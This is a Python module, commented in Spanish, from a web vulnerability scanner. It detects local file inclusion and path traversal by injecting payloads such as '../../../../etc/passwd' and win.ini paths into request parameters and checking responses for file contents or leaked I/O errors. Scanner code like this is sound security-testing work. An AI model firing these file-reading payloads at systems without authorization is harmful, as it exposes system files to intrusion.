import logging
import re
from typing import List

from core.models import ScannerModule, Target, Vulnerability, Severity
from modules.injection_points import collect_points

logger = logging.getLogger("VulnSeeker")


class LFIScanner(ScannerModule):
    """Detecta inclusión/lectura de archivos locales (LFI / path traversal).

    Ataca todos los vectores del objetivo (GET query, POST/GET form y JSON, vía
    :func:`collect_points`) con dos técnicas complementarias:

    - **Contenido reflejado:** si la respuesta trae el contenido del archivo
      objetivo (``root:x:0:0`` de ``/etc/passwd``, secciones de ``win.ini``), la
      inclusión es directa. Es la LFI "clásica".
    - **Error-based (ciega):** cuando la aplicación intenta abrir la ruta y falla,
      a veces filtra la excepción de E/S en la respuesta (``FileNotFoundException``,
      ``failed to open stream``…). Es el análogo del SQLi basado en errores y
      permite detectar path traversal aunque el contenido del archivo no se refleje.

    Ambas técnicas usan una guarda de baseline: sólo se reporta si la señal aparece
    con el payload y NO con un valor benigno, para descartar falsos positivos
    preexistentes en la página.
    """

    PAYLOADS = [
        "../../../../etc/passwd",
        "/etc/passwd",
        "../../../../../../../../etc/passwd",
        "../../../../windows/win.ini",
        "../../../../boot.ini",
        "../../etc/passwd%00",
        "/etc/passwd%00",
        "../../../../windows/win.ini%00",
        "../../../../boot.ini%00",
    ]
    FALLBACK_PARAMS = ["page", "file", "doc", "view", "include", "content"]

    # Valor benigno neutro para la petición baseline.
    BENIGN = "index"

    # Firmas de CONTENIDO: el archivo objetivo se refleja en la respuesta.
    CONTENT_SIGNATURES = [
        r"root:x:0:0:",              # /etc/passwd
        r"\[(extensions|fonts)\]",   # win.ini
    ]

    # Firmas de ERROR: la app intentó abrir la ruta y filtró la excepción de E/S.
    # Se eligen firmas específicas de "archivo/ruta no resuelta" (baja tasa de FP);
    # se evitan errores de E/S genéricos que podrían dispararse por otras causas.
    ERROR_SIGNATURES = [
        "java.io.FileNotFoundException",          # Java: new File / FileInputStream
        "java.nio.file.NoSuchFileException",
        "java.nio.file.AccessDeniedException",
        "System.IO.FileNotFoundException",        # .NET
        "System.IO.DirectoryNotFoundException",
        "failed to open stream",                  # PHP: include/fopen
        "Failed opening required",
    ]

    @property
    def name(self) -> str:
        return "Local File Inclusion (LFI)"

    @property
    def description(self) -> str:
        return ("Detecta inclusión/lectura de archivos locales por contenido "
                "reflejado y por fugas de errores de E/S (path traversal ciego).")

    def run(self, target: Target) -> List[Vulnerability]:
        vulns: List[Vulnerability] = []
        headers = dict(target.headers) if target.headers else None
        points = collect_points(target, fallback_params=self.FALLBACK_PARAMS)

        for pt in points:
            self._probe(pt, headers, vulns)  # un hallazgo por punto como máximo

        return vulns

    def _probe(self, pt, headers, vulns) -> bool:
        base = pt.send(self.BENIGN, headers=headers)
        baseline = (base.text if base is not None else "") or ""

        for payload in self.PAYLOADS:
            resp = pt.send(payload, headers=headers)
            if resp is None:
                continue
            body = resp.text or ""

            # (1) Contenido del archivo reflejado (LFI directa).
            for pat in self.CONTENT_SIGNATURES:
                if re.search(pat, body, re.IGNORECASE) and not re.search(pat, baseline, re.IGNORECASE):
                    self._report(pt, payload, "contenido reflejado", body, vulns)
                    return True

            # (2) Excepción de E/S filtrada (path traversal ciego).
            low_body, low_base = body.lower(), baseline.lower()
            for sig in self.ERROR_SIGNATURES:
                if sig.lower() in low_body and sig.lower() not in low_base:
                    self._report(pt, payload, f"error de E/S ({sig})", body, vulns)
                    return True

        return False

    def _report(self, pt, payload, via, body, vulns) -> None:
        evidence = body[:80].replace("\n", " ").replace("\r", " ")
        vulns.append(Vulnerability(
            name="Local File Inclusion (LFI)",
            description=f"Parámetro vulnerable: {pt.param_name} (detección por {via}).",
            severity=Severity.CRITICAL,
            target_url=pt.report_url,
            payload=f"{payload} | evidencia: {evidence}",
        ))
        logger.info(f"📂 LFI en '{pt.param_name}' vía {via}")
